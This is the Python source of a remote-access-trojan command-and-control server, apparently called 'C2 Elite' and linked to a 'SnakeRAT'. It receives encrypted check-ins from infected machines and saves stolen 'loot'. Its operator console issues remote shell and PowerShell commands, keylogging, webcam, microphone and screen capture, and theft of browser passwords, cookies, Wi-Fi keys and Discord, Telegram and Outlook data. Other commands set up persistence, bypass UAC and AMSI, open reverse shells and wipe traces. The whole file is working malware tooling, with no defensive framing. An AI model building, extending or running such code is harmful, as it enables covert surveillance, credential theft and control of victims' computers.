#!/usr/bin/env python3
"""
Advanced C2 Server - Pro Series
Version: 5.0 CLI Elite (Restoration)
"""

import socket
import threading
import json
import os
import base64
import hashlib
import time
import sqlite3
import sys
import argparse
import logging
import datetime
import random
import string
import ssl
import gzip
import pickle
import queue
import shlex
from pathlib import Path
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, asdict
from cryptography.fernet import Fernet
import colorama
from colorama import Fore, Style, Back

# Initialize colorama
colorama.init()

@dataclass
class ServerConfig:
    host: str = '0.0.0.0'
    port: int = 4444
    encryption_key: str = 'AdvancedSnakeRAT_2024_CrossPlatform'
    loot_dir: str = 'loot'
    database: str = 'c2.db'
    log_file: str = 'c2_server.log'
    debug: bool = False
    heartbeat_timeout: int = 120

class CryptoManager:
    def __init__(self, key: Any):
        # Always use the master key hashing for consistent static encryption
        key_bytes = key if isinstance(key, bytes) else key.encode()
        self.key = base64.urlsafe_b64encode(hashlib.sha256(key_bytes).digest())
        self.fernet = Fernet(self.key)
    
    def encrypt_json(self, data: Any) -> bytes:
        return self.fernet.encrypt(json.dumps(data).encode())
    
    def decrypt_json(self, data: bytes) -> Any:
        return json.loads(self.fernet.decrypt(data).decode())

class DatabaseManager:
    def __init__(self, db_path: str):
        self.db_path = db_path
        self._init_db()
    def _conn(self):
        conn = sqlite3.connect(self.db_path, check_same_thread=False)
        conn.row_factory = sqlite3.Row
        return conn
    def _init_db(self):
        c = self._conn()
        c.execute('CREATE TABLE IF NOT EXISTS clients (id TEXT PRIMARY KEY, ip TEXT, hostname TEXT, os TEXT, last_seen TEXT)')
        # Schema migration: Add 'user' column if missing
        try:
            c.execute('ALTER TABLE clients ADD COLUMN user TEXT')
        except: pass
        c.execute('CREATE TABLE IF NOT EXISTS loot (id INTEGER PRIMARY KEY, client_id TEXT, type TEXT, filename TEXT, path TEXT, timestamp TEXT)')
        c.commit()
    def execute(self, q, p=()):
        conn = self._conn()
        res = conn.execute(q, p)
        conn.commit()
        return res

class AdvancedC2Server:
    def __init__(self, config: ServerConfig):
        self.config = config
        self.clients: Dict[str, Any] = {}
        self.client_lock = threading.Lock()
        self.running = False
        self.selected_client = None
        
        self.logger = Logger(config.log_file, config.debug)
        self.db = DatabaseManager(config.database)
        self.crypto = CryptoManager(config.encryption_key)
        self.parser = CommandParser(self)
        self.stream_queue = queue.Queue(maxsize=10)  # For cross-thread safe frame passing
        self._stream_active_cid = None  # Track which client is streaming
        
        # Test cv2 availability once at startup (system cv2 can be corrupted)
        try:
            import cv2
            import numpy as np
            self._cv2_available = True
        except Exception as e:
            self._cv2_available = False
            self.logger.warning(f"cv2/numpy not available — live stream display disabled: {e}")

    def start(self):
        self.running = True
        threading.Thread(target=self._command_loop, daemon=True).start()
        
        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            server_sock.bind((self.config.host, self.config.port))
            server_sock.listen(100)
            self.logger.success(f"C2 Elite Server listening on {self.config.host}:{self.config.port}")
            server_sock.settimeout(1.0)  # Allow main thread to pump the stream loop
            while self.running:
                # --- Stream Display Loop (must run on main thread for OpenCV) ---
                try:
                    frame_data = self.stream_queue.get_nowait()
                    self._render_stream_frame(frame_data)
                except queue.Empty:
                    pass
                
                # --- Accept new connections (non-blocking) ---
                try:
                    client_sock, addr = server_sock.accept()
                    threading.Thread(target=self._handle_client, args=(client_sock, addr), daemon=True).start()
                except socket.timeout:
                    pass  # No new connection, loop back
        except Exception as e:
            self.logger.error(f"Critical server error: {e}")

    def _render_stream_frame(self, frame_data):
        """Render a stream frame in the main thread (OpenCV GUI requirement)"""
        if not getattr(self, '_cv2_available', None):
            return  # cv2 not available, skip silently
        try:
            import cv2
            import numpy as np
            cid, data_b64 = frame_data
            data = base64.b64decode(data_b64)
            nparr = np.frombuffer(data, np.uint8)
            img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
            if img is not None:
                win_name = f"Live Stream - {cid[:12]}"
                cv2.namedWindow(win_name, cv2.WINDOW_NORMAL)
                cv2.imshow(win_name, img)
                key = cv2.waitKey(1) & 0xFF
                if key == ord('q'):
                    cv2.destroyWindow(win_name)
                    self.send_command([cid], 'stream', {'action': 'stop'})
                    self._stream_active_cid = None
        except Exception as e:
            self.logger.error(f"Stream render error: {e}")

    def _handle_client(self, sock, addr):
        cid = None
        try:
            sock.settimeout(self.config.heartbeat_timeout)
            # Direct Authentication (Original Static Key)
            raw_init = self._recv_raw(sock)
            if not raw_init: return
            client_init = self.crypto.decrypt_json(raw_init)
            if client_init.get('type') != 'init':
                self.logger.warning(f"Unauthorized access attempt from {addr[0]}")
                return
            
            cid = client_init.get('client_id')
            with self.client_lock:
                self.clients[cid] = {'sock': sock, 'addr': addr, 'info': client_init.get('info')}
            
            self.logger.success(f"Session Established: {cid} ({addr[0]})")
            self._update_db(cid, addr[0], client_init.get('info', {}))
            
            while self.running and cid in self.clients:
                try:
                    data = self._recv_json(sock)
                    if not data:
                        self.logger.warning(f"Connection closed by remote host: {cid}")
                        break
                    self._handle_msg(cid, data)
                except Exception as loop_e:
                    self.logger.error(f"Error in message loop for {cid}: {loop_e}")
                    break
        except Exception as e:
            self.logger.error(f"Session initialization failed [{addr[0]}]: {e}")
        finally:
            self._remove_client(cid)
            sock.close()

    def _send_raw(self, sock, data): sock.sendall(len(data).to_bytes(4, 'big') + data)
    def _recv_raw(self, sock):
        try:
            len_b = self._recv_all(sock, 4)
            if not len_b: return None
            return self._recv_all(sock, int.from_bytes(len_b, 'big'))
        except: return None
    def _recv_all(self, sock, n):
        d = b''
        while len(d) < n:
            p = sock.recv(n - len(d))
            if not p: return None
            d += p
        return d
    def _recv_json(self, sock):
        raw = self._recv_raw(sock)
        return self.crypto.decrypt_json(raw) if raw else None

    def _handle_msg(self, cid, msg):
        m_type = msg.get('type')
        if m_type == 'heartbeat': return
        if m_type == 'stream_frame':
            self._handle_stream_frame(cid, msg)
            return
        if m_type == 'result':
            rid = msg.get('id') or 'cmd'
            data = msg.get('data')
            print(f"{Fore.CYAN}\n[RESULT][{cid}] [{rid}]")
            if isinstance(data, dict):
                if 'stdout' in data or 'stderr' in data:
                    if data.get('stdout'): print(f"{Fore.WHITE}{data['stdout']}")
                    if data.get('stderr'): print(f"{Fore.RED}ERROR: {data['stderr']}")
                    print(f"{Fore.YELLOW}[RC: {data.get('returncode', 0)}] [CWD: {data.get('cwd', '?')}]")
                else:
                    print(f"{Fore.WHITE}{json.dumps(data, indent=2)}")
            else:
                print(f"{Fore.WHITE}{data}")
            print(f"{Fore.CYAN}{'='*40}{Style.RESET_ALL}\n")
        elif m_type == 'loot':
            self._save_loot(cid, msg)
        elif m_type == 'error':
            self.logger.error(f"[{cid}] Execution Failure: {msg.get('error')}")

    def _handle_stream_frame(self, cid, msg):
        """Push stream frame into queue for main-thread rendering"""
        data_b64 = msg.get('data', '')
        if not data_b64:
            return
        self._stream_active_cid = cid
        try:
            # Drop frame if queue is full (don't block socket thread)
            self.stream_queue.put_nowait((cid, data_b64))
        except queue.Full:
            pass

    def _save_loot(self, cid, msg):
        lt = msg.get('loot_type', 'misc')
        fn = msg.get('filename') or f"{cid}_{lt}_{int(time.time())}.bin"
        path = Path(self.config.loot_dir) / lt
        path.mkdir(parents=True, exist_ok=True)
        fpath = path / fn
        with open(fpath, 'wb') as f: f.write(base64.b64decode(msg.get('data')))
        self.db.execute('INSERT INTO loot (client_id, type, filename, path, timestamp) VALUES (?,?,?,?,?)',
                       (cid, lt, fn, str(fpath), datetime.datetime.now().isoformat()))
        self.logger.success(f"LOOT COLLECTED from {cid}: {fn} ({lt})")

    def _update_db(self, cid, ip, info):
        # Harmonize keys: node -> hostname, platform -> os, username -> user
        h = info.get('hostname') or info.get('node') or '?'
        o = info.get('platform') or info.get('system') or '?'
        u = info.get('username') or info.get('user') or '?'
        self.db.execute('INSERT OR REPLACE INTO clients (id, ip, hostname, os, user, last_seen) VALUES (?,?,?,?,?,?)',
                       (cid, ip, h, o, u, datetime.datetime.now().isoformat()))

    def _remove_client(self, cid):
        with self.client_lock:
            if cid in self.clients:
                del self.clients[cid]
                if self.selected_client == cid: self.selected_client = None
                self.logger.warning(f"Session Terminated: {cid}")

    def send_command(self, targets, c_type, params=None):
        cmd_id = os.urandom(4).hex()
        for cid in targets:
            client = self.clients.get(cid)
            if not client: continue
            try:
                payload = {'id': cmd_id, 'type': c_type, 'params': params or {}}
                self._send_raw(client['sock'], self.crypto.encrypt_json(payload))
            except: pass

    def _command_loop(self):
        while self.running:
            try:
                if getattr(self.parser, 'shell_mode', False):
                    prompt = f"{Fore.GREEN}SHELL@{self.selected_client or 'all'}{Style.RESET_ALL} > "
                else:
                    prompt = f"{Fore.GREEN}C2@{self.selected_client or 'all'}{Style.RESET_ALL} > "
                line = input(prompt).strip()
                if line: self.parser.parse(line)
            except (EOFError, KeyboardInterrupt): break

class CommandParser:
    def __init__(self, server: AdvancedC2Server): 
        self.server = server
        self.shell_mode = False
        
    def parse(self, text):
        try:
            if self.shell_mode:
                cmd_first = text.strip().split()[0].lower() if text.strip() else ""
                if cmd_first in ['exit', 'quit']:
                    self.shell_mode = False
                    self.server.logger.info("Exited interactive shell mode.")
                    return
                if self.server.selected_client:
                    self.server.send_command([self.server.selected_client], 'shell', {'command': text})
                else:
                    self.server.logger.error("Client disconnected. Leaving shell mode.")
                    self.shell_mode = False
                return

            try:
                parts = shlex.split(text)
            except ValueError as e:
                self.server.logger.error(f"Command formatting error: {e}")
                return
                
            cmd = parts[0].lower(); args = parts[1:]
            targets = [self.server.selected_client] if self.server.selected_client else list(self.server.clients.keys())
            
            # --- Local Control ---
            if cmd == 'clients': self._show_clients()
            elif cmd == 'select': 
                if args: self.server.selected_client = args[0]
                else: print(f"Active Client: {self.server.selected_client}")
            elif cmd == 'deselect': self.server.selected_client = None
            elif cmd == 'clear': os.system('cls' if os.name == 'nt' else 'clear')
            elif cmd == 'help': self._show_help()
            elif cmd == 'exit': os._exit(0)
            
            # --- Remote Execution ---
            elif cmd in ['shell', 'cmd']: 
                if args:
                    self.server.send_command(targets, 'shell', {'command': ' '.join(args)})
                else:
                    if not self.server.selected_client:
                        self.server.logger.error("Select a client first to enter interactive shell mode.")
                        return
                    self.shell_mode = True
                    self.server.logger.info("Entered interactive shell mode. Type 'exit' to quit.")
            elif cmd in ['powershell', 'ps']: self.server.send_command(targets, 'powershell', {'command': ' '.join(args)})
            elif cmd == 'script': self.server.send_command(targets, 'script', {'code': open(args[0]).read()})
            
            # --- Files ---
            elif cmd == 'download': self.server.send_command(targets, 'download', {'path': args[0]})
            elif cmd == 'upload': self._upload(targets, args[0])
            elif cmd == 'write': self.server.send_command(targets, 'write_file', {'path': args[0], 'content': ' '.join(args[1:])})
            elif cmd == 'browse': self.server.send_command(targets, 'file_browser', {'path': args[0] if args else '.'})
            elif cmd == 'crypt': self.server.send_command(targets, 'file_crypt', {'path': args[0], 'action': args[1]})
            
            # --- Surveillance ---
            elif cmd == 'screenshot': self.server.send_command(targets, 'screenshot')
            elif cmd == 'webcam': self.server.send_command(targets, 'webcam')
            elif cmd == 'mic': self.server.send_command(targets, 'microphone', {'duration': int(args[0]) if args else 10})
            elif cmd == 'keylog': self.server.send_command(targets, 'keylog', {'action': args[0] if args else 'dump'})
            elif cmd == 'clip': self.server.send_command(targets, 'clipboard', {'action': args[0] if args else 'get', 'text': ' '.join(args[1:]) if len(args)>1 else ''})
            
            # --- Credentials ---
            elif cmd == 'passwords': self.server.send_command(targets, 'browser_passwords')
            elif cmd == 'cookies': self.server.send_command(targets, 'browser_cookies')
            elif cmd == 'wifi': self.server.send_command(targets, 'wifi_passwords')
            elif cmd == 'chromelevator': self.server.send_command(targets, 'chromelevator')
            
            # --- Persistence / Privilege ---
            elif cmd == 'persist': self.server.send_command(targets, 'persistence')
            elif cmd == 'unpersist': self.server.send_command(targets, 'unpersist')
            elif cmd == 'elevate': self.server.send_command(targets, 'elevate')
            elif cmd == 'amsi': self.server.send_command(targets, 'amsi_bypass')
            
            # --- Network / System ---
            elif cmd == 'sysinfo': self.server.send_command(targets, 'system_info')
            elif cmd == 'process': self.server.send_command(targets, 'process', {'action': args[0] if args else 'list', 'pid': args[1] if len(args)>1 else None})
            elif cmd == 'registry': self.server.send_command(targets, 'registry', {'action': args[0], 'path': args[1]})
            elif cmd == 'scan': self.server.send_command(targets, 'port_scan', {'target': args[0], 'ports': args[1] if len(args)>1 else '1-1024'})
            elif cmd == 'socks': self.server.send_command(targets, 'socks', {'port': int(args[0]) if args else 1080})
            elif cmd == 'revshell': self.server.send_command(targets, 'reverse_shell', {'ip': args[0], 'port': int(args[1])})
            
            # --- UI Actions ---
            elif cmd == 'url': self.server.send_command(targets, 'open_url', {'url': args[0]})
            elif cmd == 'msg': self.server.send_command(targets, 'message_box', {'title': 'Admin', 'message': ' '.join(args)})
            elif cmd == 'wallpaper': self.server.send_command(targets, 'wallpaper', {'path': args[0]})
            elif cmd == 'power': self.server.send_command(targets, 'power', {'action': args[0]})
            
            # --- Hard Cleanup ---
            elif cmd == 'abort': self.server.send_command(targets, 'abort', {'task_id': args[0] if args else 'all'})
            elif cmd == 'clean': self.server.send_command(targets, 'clean_traces')
            elif cmd == 'destroy': self.server.send_command(targets, 'self_destruct')
            
            # --- New Advanced Features ---
            elif cmd == 'netstat': self.server.send_command(targets, 'netstat')
            elif cmd == 'arp': self.server.send_command(targets, 'arp')
            elif cmd == 'window': self.server.send_command(targets, 'active_window')
            elif cmd == 'drives': self.server.send_command(targets, 'list_drives')
            elif cmd == 'av': self.server.send_command(targets, 'av_discovery')
            elif cmd == 'discord': self.server.send_command(targets, 'extract_discord')
            elif cmd == 'telegram': self.server.send_command(targets, 'extract_telegram')
            elif cmd == 'outlook': self.server.send_command(targets, 'extract_outlook')
            elif cmd == 'stream': self.server.send_command(targets, 'stream', {'action': args[0] if args else 'start', 'fps': int(args[1]) if len(args)>1 else 15})
            elif cmd == 'uac': self.server.send_command(targets, 'uac_bypass', {'program': args[0] if args else None})
            elif cmd == 'wmi': self.server.send_command(targets, 'wmi_persistence', {'command': args[0] if args else None})
            elif cmd == 'input': self.server.send_command(targets, 'input_control', {'action': args[0], 'x': int(args[1]) if len(args)>1 else 0, 'y': int(args[2]) if len(args)>2 else 0, 'button': args[3] if len(args)>3 else 'left', 'text': ' '.join(args[1:]) if args[0]=='type' else ''})
            elif cmd == 'block': self.server.send_command(targets, 'block_input', {'action': args[0] if args else 'block'})
            elif cmd == 'browser_kill': self.server.send_command(targets, 'close_browser')
            elif cmd == 'autorun': self.server.send_command(targets, 'set_autorun', {'commands': json.loads(args[0])})
            
            else: print(f"Error: Unknown command '{cmd}'")
        except Exception as e: print(f"Command Error: {e}")

    def _upload(self, targets, l_path):
        try:
            with open(l_path, 'rb') as f: data = base64.b64encode(f.read()).decode()
            self.server.send_command(targets, 'upload', {'filename':os.path.basename(l_path), 'data': data})
        except Exception as e: print(f"Upload failed: {e}")

    def _show_clients(self):
        print(f"\n{Fore.YELLOW}{'ID':<18} {'IP':<15} {'System':<20} {'User':<15}{Style.RESET_ALL}")
        print("-" * 75)
        with self.server.client_lock:
            for cid, info in self.server.clients.items():
                s = info.get('info') or {}
                # Harmonized display
                h = s.get('hostname') or s.get('node') or '?'
                o = s.get('platform') or s.get('os') or '?'
                u = s.get('username') or s.get('user') or '?'
                print(f"{cid:<18} {info['addr'][0]:<15} {o[:20]:<20} {u:<15}")
        print()

    def _show_help(self):
        print(f"""
{Fore.CYAN}--- C2 ELITE CLI HELP ---{Style.RESET_ALL}
{Fore.GREEN}MGMT:{Style.RESET_ALL}      clients, select <id>, deselect, clear, exit
{Fore.GREEN}EXEC:{Style.RESET_ALL}      shell <cmd>, ps <cmd>, script <file>, amsi
{Fore.GREEN}FILES:{Style.RESET_ALL}     browse <p>, download <p>, upload <f>, write <p> <txt>, crypt <p> <enc/dec>
{Fore.GREEN}SPY:{Style.RESET_ALL}       screenshot, webcam, mic <sec>, keylog <dump/stop>, clip <get/set>
{Fore.GREEN}DATA:{Style.RESET_ALL}      passwords, cookies, wifi, chromelevator, discord, telegram, outlook
{Fore.GREEN}NET:{Style.RESET_ALL}       scan <ip> <p>, socks <p>, revshell <ip> <p>, netstat, arp
{Fore.GREEN}SYSTEM:{Style.RESET_ALL}    sysinfo, process [list/kill], service, registry, power [reboot/lock], window, drives, av
{Fore.GREEN}ADVANCED:{Style.RESET_ALL}  stream [start/stop] [int], uac [path], wmi [cmd], input <m/c/t> [x] [y], block [on/off], browser_kill, autorun ['[[{{"type":"..."}}]]']
{Fore.GREEN}CLEANUP:{Style.RESET_ALL}   persist, unpersist, elevate, clean, destroy, abort [id]
        """)

class Logger:
    def __init__(self, f, d): self.f=f; self.d=d
    def success(self, m): self._l("OK", m, Fore.CYAN)
    def info(self, m): self._l("INFO", m, Fore.GREEN)
    def warning(self, m): self._l("WARN", m, Fore.YELLOW)
    def error(self, m): self._l("FAIL", m, Fore.RED)
    def debug(self, m): 
        if self.d: self._l("DEBUG", m, Fore.MAGENTA)
    def _l(self, l, m, c): print(f"{Fore.WHITE}[{datetime.datetime.now().strftime('%H:%M:%S')}]{Style.RESET_ALL} {c}[{l}]{Style.RESET_ALL} {m}")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--port', type=int, default=4444)
    args = parser.parse_args()
    
    server = AdvancedC2Server(ServerConfig(port=args.port))
    try: server.start()
    except KeyboardInterrupt: sys.exit(0)

if __name__ == "__main__": main()